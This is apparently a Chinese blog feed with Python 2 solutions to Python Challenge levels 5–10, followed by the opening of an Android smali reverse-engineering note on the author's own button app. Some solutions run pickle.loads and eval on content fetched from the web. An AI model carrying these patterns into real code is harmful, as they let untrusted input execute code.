class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle模块的使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peak</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/def/peak.html"</span>).text</span><br><span class="line">    banner_name = re.findall(<span class="string">r""</span>, page_source)[<span class="number">0</span>]</span><br><span class="line">    banner_url = <span class="string">""</span>.join([<span class="string">"http://www.pythonchallenge.com/pc/def/"</span>, banner_name])</span><br><span class="line">    banner_content = requests.get(banner_url).text</span><br><span class="line">    <span class="comment"># print banner_content</span></span><br><span class="line">    banner_obj = pickle.loads(banner_content)</span><br><span class="line">    <span class="keyword">for</span> list_ <span class="keyword">in</span> banner_obj:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">""</span>.join([tuple_[<span class="number">0</span>] * tuple_[<span class="number">1</span>] <span class="keyword">for</span> tuple_ <span class="keyword">in</span> list_])</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">              <span class="comment">#####                                                                      ##### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">      <span class="comment">###      ####   ###         ###       #####   ###    #####   ###          ###       #### </span></span><br><span class="line">   <span class="comment">###   ##    #### #######     ##  ###      #### #######   #### #######     ###  ###     #### </span></span><br><span class="line">  <span class="comment">###     ###  #####    ####   ###   ####    #####    ####  #####    ####   ###     ###   #### </span></span><br><span class="line"> <span class="comment">###           ####     ####   ###    ###    ####     ####  ####     ####  ###      ####  #### </span></span><br><span class="line"> <span class="comment">###           ####     ####          ###    ####     ####  ####     ####  ###       ###  #### </span></span><br><span class="line"><span class="comment">####           ####     ####     ##   ###    ####     ####  ####     #### ####       ###  #### </span></span><br><span class="line"><span class="comment">####           ####     ####   ##########    ####     ####  ####     #### ##############  #### </span></span><br><span class="line"><span class="comment">####           ####     ####  ###    ####    ####     ####  ####     #### ####            #### </span></span><br><span class="line"><span class="comment">####           ####     #### ####     ###    ####     ####  ####     #### ####            #### </span></span><br><span class="line"> <span class="comment">###           ####     #### ####     ###    ####     ####  ####     ####  ###            #### </span></span><br><span class="line">  <span class="comment">###      ##  ####     ####  ###    ####    ####     ####  ####     ####   ###      ##   #### </span></span><br><span class="line">   <span class="comment">###    ##   ####     ####   ###########   ####     ####  ####     ####    ###    ##    #### </span></span><br><span class="line">      <span class="comment">###     ######    #####    ##    #### ######    ###########    #####      ###      ######</span></span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_6"><a href="http://www.pythonchallenge.com/pc/def/channel.html" target="_blank" rel="external">python challenge 6</a></h3><p><code>http://www.pythonchallenge.com/pc/def/channel.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-6.jpg" alt="6"><br>一张拉链图片，看了源码也没有任何提示，只知道是要捐赠。。。<br>再仔细看第一行，  ，将html变zip<br>下载channel.zip文件，链接：<a href="http://www.pythonchallenge.com/pc/def/channel.zip" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/channel.zip</a><br>下载完成后解压，和第四题一样，只不过多了文件遍历操作，遍历从任意文件开始都可以。<br>我这里从os.walk遍历到的文件列表中第一个文件开始遍历。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">channel</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    root_path = <span class="string">"D:\\downloads\\channel"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">linked_file</span><span class="params">(times=<span class="number">1</span>, file_name=<span class="string">"123456"</span>)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_path = <span class="string">"\\"</span>.join([root_path, file_name])</span><br><span class="line">            file_content = open(file_path, <span class="string">"r+"</span>).read()</span><br><span class="line">            next_file_name = re.findall(<span class="string">"Next nothing is ([0-9]+)"</span>, file_content)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%d -&gt; %s.txt"</span> % (times, next_file_name)</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            linked_file(times, <span class="string">""</span>.join([next_file_name, <span class="string">".txt"</span>]))</span><br><span class="line">        <span class="comment"># 匹配不到跳到异常</span></span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the right link in file : %s"</span> % file_name</span><br><span class="line">            <span class="keyword">print</span> file_content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(root_path):</span><br><span class="line">        <span class="keyword">for</span> file_ <span class="keyword">in</span> files:</span><br><span class="line">            linked_file(<span class="number">1</span>, file_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">&gt;&gt;&gt; the right link <span class="keyword">in</span> file : <span class="number">46145.</span>txt</span><br><span class="line">    Collect the comments.</span><br></pre></td></tr></table></figure>
<p>坑爹的答案，让我收集注释，那么答案在哪里。。。<br>再仔细翻解压的文件，发现里边有个readme.txt !!!<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome to my zipped list.</span><br><span class="line">hint1: start <span class="keyword">from</span> <span class="number">90052</span></span><br><span class="line">hint2: answer <span class="keyword">is</span> inside the zip</span><br></pre></td></tr></table></figure></p>
<p>将代码中linked<em>file(1, file</em>)改为linked_file(1, “90052.txt”)<br>最后输出答案一样！！！</p>
<p>难道是我的解压方式不对？！？！<br>调用zipfile模块,使用ZipInfo类获取comment<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">channel</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line">    zf = zipfile.ZipFile(<span class="string">"D:\\downloads\\channel.zip"</span>)</span><br><span class="line">    result = []</span><br><span class="line">    begin_file_name = <span class="string">"90052.txt"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        z_info = zf.getinfo(begin_file_name)</span><br><span class="line">        f = zf.open(z_info)</span><br><span class="line">        f_content = f.read()</span><br><span class="line">        next_file_name = re.findall(<span class="string">r"Next nothing is ([0-9]+)"</span>, f_content)</span><br><span class="line">        f.close()</span><br><span class="line">        result.append(z_info.comment)</span><br><span class="line">        <span class="keyword">if</span> next_file_name:</span><br><span class="line">            begin_file_name = <span class="string">"%s.txt"</span> % next_file_name[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span>.join(result)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">****************************************************************</span><br><span class="line">****************************************************************</span><br><span class="line">**                                                            **</span><br><span class="line">**   OO    OO    XX      YYYY    GG    GG  EEEEEE NN      NN  **</span><br><span class="line">**   OO    OO  XXXXXX   YYYYYY   GG   GG   EEEEEE  NN    NN   **</span><br><span class="line">**   OO    OO XXX  XXX YYY   YY  GG GG     EE       NN  NN    **</span><br><span class="line">**   OOOOOOOO XX    XX YY        GGG       EEEEE     NNNN     **</span><br><span class="line">**   OOOOOOOO XX    XX YY        GGG       EEEEE      NN      **</span><br><span class="line">**   OO    OO XXX  XXX YYY   YY  GG GG     EE         NN      **</span><br><span class="line">**   OO    OO  XXXXXX   YYYYYY   GG   GG   EEEEEE     NN      **</span><br><span class="line">**   OO    OO    XX      YYYY    GG    GG  EEEEEE     NN      **</span><br><span class="line">**                                                            **</span><br><span class="line">****************************************************************</span><br><span class="line"> **************************************************************</span><br></pre></td></tr></table></figure></p>
<p>将url改为hockey.html，竟然有小关卡！！！<br>it’s in the air. look at the letters<br>赶紧开开脑洞，空气中是什么，氧气啊！<br>oxygen :)</p>
<h3 id="python_challenge_7"><a href="http://www.pythonchallenge.com/pc/def/oxygen.html" target="_blank" rel="external">python challenge 7</a></h3><p><code>http://www.pythonchallenge.com/pc/def/oxygen.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-7.jpg" alt="7"><br>这个题需要解析图片，之前没有接触到因此是查资料完成。<br>1.需要安装<a href="http://www.pythonware.com/products/pil/#pil117" target="_blank" rel="external">PIL库</a><br>2.截取黑白部分<br>3.将RGBA格式的像素每个像素值按照L8位黑白像素的格式转成一个acsii码值<br>4.将最后获得的答案转换为ASCII码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oxygen</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    img = Image.open(<span class="string">"oxygen.png"</span>)</span><br><span class="line">    <span class="comment"># left,top,right,bottom</span></span><br><span class="line">    box = (<span class="number">0</span>, <span class="number">43</span>, <span class="number">608</span>, <span class="number">52</span>)</span><br><span class="line">    belt = img.crop(box)</span><br><span class="line">    <span class="comment"># get a sequence object containing pixel values</span></span><br><span class="line">    pixels = belt.getdata()</span><br><span class="line">    print(<span class="string">'mode: %s'</span> % img.mode)</span><br><span class="line">    print(<span class="string">'amount of pixel: %d'</span> % len(pixels))</span><br><span class="line">    <span class="comment"># print(pixels[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># convert mode RGBA to mode L</span></span><br><span class="line">    l_belt = belt.convert(<span class="string">'L'</span>)</span><br><span class="line">    <span class="comment"># get a sequence object containing pixel values</span></span><br><span class="line">    l_pixels = l_belt.getdata()</span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">608</span>, <span class="number">7</span>):</span><br><span class="line">        result.append(chr(l_pixels[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(result)</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; smart guy, you made it. the next level <span class="keyword">is</span> [<span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">121</span>]</span><br></pre></td></tr></table></figure>
<p>最后将[105, 110, 116, 101, 103, 114, 105, 116, 121]转为ascii即为答案:integrity</p>
<h3 id="python_challenge_8"><a href="http://www.pythonchallenge.com/pc/def/integrity.html" target="_blank" rel="external">python challenge 8</a></h3><p><code>http://www.pythonchallenge.com/pc/def/integrity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-8.jpg" alt="8"><br>点击中间的蜜蜂弹出要求输入用户名和密码<br>然后看下源码，找到了用户名密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">un: <span class="string">'BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084'</span></span><br><span class="line">pw: <span class="string">'BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08'</span></span><br></pre></td></tr></table></figure></p>
<p>看下加密字符串特征BZ开头，猜测是否为bz2压缩，尝试成功。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrity</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    un = <span class="string">'BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084'</span></span><br><span class="line">    pw = <span class="string">'BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">": "</span>.join([<span class="string">"username"</span>, bz2.decompress(un)])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">": "</span>.join([<span class="string">"password"</span>, bz2.decompress(pw)])</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    username: huge</span><br><span class="line">    password: file</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_9"><a href="http://www.pythonchallenge.com/pc/return/good.html" target="_blank" rel="external">python challenge 9</a></h3><p><code>http://www.pythonchallenge.com/pc/return/good.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9.jpg" alt="9"><br>查看下源码找到最下边注释部分，和8题页面源码部分是不是很相似，应该是绘制图片的RGB值。<br>替换过去试试看，鼠标移动，发现浮现了一头牛的图案。<br>下边通过代码将这个图片完整的绘制出来。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>, (<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Authorization"</span>: <span class="string">"Basic aHVnZTpmaWxl"</span></span><br><span class="line">    &#125;</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/return/good.html"</span>, headers=headers).text</span><br><span class="line">    result = re.findall(<span class="string">r"first:\s([\s\S]+)second:\s([\s\S]+)--&gt;"</span>, page_source)</span><br><span class="line">    <span class="keyword">if</span> len(result) &gt; <span class="number">0</span> <span class="keyword">and</span> len(result[<span class="number">0</span>]) == <span class="number">2</span>:</span><br><span class="line">        first, second = result[<span class="number">0</span>][<span class="number">0</span>], result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        first_points = list(eval(first.replace(<span class="string">"\n"</span>, <span class="string">""</span>)))</span><br><span class="line">        second_points = list(eval(second.replace(<span class="string">"\n"</span>, <span class="string">""</span>)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(first_points), <span class="number">2</span>):</span><br><span class="line">            draw.line(first_points[i:i + <span class="number">4</span>], fill=<span class="string">'white'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(second_points), <span class="number">2</span>):</span><br><span class="line">            draw.line(second_points[i:i + <span class="number">4</span>], fill=<span class="string">'white'</span>)</span><br><span class="line">        im.save(<span class="string">'img/09.jpg'</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后打印出来：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9-bull.jpg" alt="9-bull"><br>看到牛先想到单词cow，然后进去试试看，发现有新的提示：<br>hmm. it’s a male.<br>那就是公牛喽，换成bull,成功。</p>
<h3 id="python_challenge_10"><a href="http://www.pythonchallenge.com/pc/return/bull.html" target="_blank" rel="external">python challenge 10</a></h3><p><code>http://www.pythonchallenge.com/pc/return/bull.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-10.jpg" alt="10"><br>这个题的图片赫然就是我们绘制的那头牛哇，感觉萌萌哒。<br>看下边len(a[30])=? 要知道这个答案，肯定要得到a这个序列。<br>查看下页面源码，点开里边的sequence.txt内容为(点击牛也会跳出)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">1211</span>, <span class="number">111221</span>,</span><br></pre></td></tr></table></figure></p>
<p>显然，要得到的答案就是这里了，下边找规律吧。</p>
<table>
<thead>
<tr>
<th>index</th>
<th style="text-align:left">look</th>
<th style="text-align:left">say</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td style="text-align:left"></td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td>1</td>
<td style="text-align:left">第0项有 1个1</td>
<td style="text-align:left">11</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:left">第1项有 2个1</td>
<td style="text-align:left">21</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:left">第2项有 1个2 1个1</td>
<td style="text-align:left">1211</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:left">第3项有 1个1 1个2 2个1</td>
<td style="text-align:left">111221</td>
</tr>
<tr>
<td>5</td>
<td style="text-align:left">…</td>
<td style="text-align:left">…</td>
</tr>
</tbody>
</table>
<p>规律找到，编写代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bull</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_next_item</span><span class="params">(str_item=<span class="string">""</span>)</span>:</span></span><br><span class="line">        item = []</span><br><span class="line">        <span class="keyword">if</span> len(str_item) == <span class="number">0</span>:</span><br><span class="line">            item.append(<span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(str_item) &gt; <span class="number">0</span>:</span><br><span class="line">            cur_list = list(str_item)</span><br><span class="line">            same_count = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len(cur_list) == <span class="number">1</span>:</span><br><span class="line">                item.append(<span class="string">""</span>.join([str(same_count), cur_list[<span class="number">0</span>]]))</span><br><span class="line">            <span class="keyword">elif</span> len(cur_list) &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cur_list)):</span><br><span class="line">                    <span class="keyword">if</span> i + <span class="number">1</span> &gt;= len(cur_list):</span><br><span class="line">                        item.append(<span class="string">""</span>.join([str(same_count), cur_list[i]]))</span><br><span class="line">                    <span class="keyword">elif</span> i + <span class="number">1</span> &lt; len(cur_list):</span><br><span class="line">                        <span class="keyword">if</span> cur_list[i] == cur_list[i+<span class="number">1</span>]:</span><br><span class="line">                            same_count += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            item.append(<span class="string">""</span>.join([str(same_count), cur_list[i]]))</span><br><span class="line">                            same_count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(item)</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    cur_item = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="number">31</span>:</span><br><span class="line">        cur_item = get_next_item(cur_item)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len(a[%d]) = %d"</span> % (index-<span class="number">1</span>, len(cur_item))</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; len(a[<span class="number">30</span>]) = <span class="number">5808</span></span><br></pre></td></tr></table></figure></p>
<p>网上看下别人的答案，找到一种更简单的实现方式，调用groupby函数，一行代码即可实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bull_ex</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line">    a = <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        a = <span class="string">''</span>.join(str(len(list(v))) + k <span class="keyword">for</span> k, v <span class="keyword">in</span> groupby(a))</span><br><span class="line">    <span class="keyword">print</span> len(a)</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="ex]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.com/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.com/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓逆向学习笔记-ClickButton]]></title>
    <link href="http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/"/>
    <id>http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/</id>
    <published>2015-05-11T09:45:11.000Z</published>
    <updated>2015-12-28T06:49:02.000Z</updated>
    <content type="html"><![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_click_button);</span><br><span class="line">    Button button = (Button)findViewById(R.id.click_me);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="annotation">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            AlertDialog.Builder alert = <span class="keyword">new</span> AlertDialog.Builder(ClickButton.<span class="keyword">this</span>);</span><br><span class="line">            alert.setTitle(<span class="string">"hello world"</span>);</span><br><span class="line">            alert.setPositiveButton(<span class="string">"exit"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">                <span class="annotation">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                    dialog.dismiss();</span><br><span class="line">                    ClickButton.<span class="keyword">this</span>.finish();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            alert.show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>点击 - 弹窗 - 退出, 功能如下图所示：</p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_1.png" alt=""></p>
<p>xml布局</p>
<pre><code>&lt;RelativeLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span>
    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span> android:layout_width=<span class="string">"match_parent"</span>
    android:layout_height=<span class="string">"match_parent"</span> android:paddingLeft=<span class="string">"<span class="variable">@dimen</span>/activity_horizontal_margin"</span>
    android:paddingRight=<span class="string">"<span class="variable">@dimen</span>/activity_horizontal_margin"</span>
    android:paddingTop=<span class="string">"<span class="variable">@dimen</span>/activity_vertical_margin"</span>
    android:paddingBottom=<span class="string">"<span class="variable">@dimen</span>/activity_vertical_margin"</span> tools:context=<span class="string">".HelloWorld"</span>&gt;
    &lt;TextView
        android:text=<span class="string">"<span class="variable">@string</span>/hello_world"</span>
        android:layout_width=<span class="string">"wrap_content"</span>
        android:layout_height=<span class="string">"wrap_content"</span>
        android:id=<span class="string">"<span class="variable">@+</span>id/textView"</span> /&gt;
    &lt;Button
        android:id = <span class="string">"<span class="variable">@+</span>id/click_me"</span>
        android:text=<span class="string">"<span class="variable">@string</span>/click_me"</span>
        android:layout_width=<span class="string">"wrap_content"</span>
        android:layout_height=<span class="string">"wrap_content"</span>
        android:layout_below=<span class="string">"<span class="variable">@+</span>id/textView"</span> /&gt;
&lt;<span class="regexp">/RelativeLayout&gt;</span>
</code></pre><h2 id="反编译">反编译</h2><p>apktool反编译成smali文件或者直接用apkIDE(apk改之理)打开，会自动进行反编译，如下图所示<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_2.png" alt=""></p>
<p>主要看主类ClickButton.smali，还有ClickButton$1.smali, ClickButton$1$1.smali两个文件。<br>这两个文件是匿名内部类的Smali代码，由于没有名字，所以编译后只能用$XXX来区分。</p>
<h2 id="逆向分析">逆向分析</h2><h3 id="主类文件头部分">主类文件头部分</h3><p>1-3行定义的是基本信息，参照着前边的源码，很容易对应起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.class <span class="keyword">public</span> Lcom/reverse/idhyt/androidreverse/ClickButton;</span><br><span class="line">.<span class="keyword">super</span> Landroid/app/Activity;</span><br><span class="line">.source <span class="string">"ClickButton.java"</span></span><br></pre></td></tr></table></figure>
<p>这是一个由ClickButton.java编译得到的smali文件（第3行），<br>它是com.reverse.idhyt.androidreverse这个package下的一个类（第1行），<br>继承自android.app.Activity，即父类为android.app.Activity（第2行）</p>
<h3 id="定位入口函数">定位入口函数</h3><p>找到onCreate函数，定位启动代码如下</p>
<pre><code><span class="comment"># virtual methods</span>
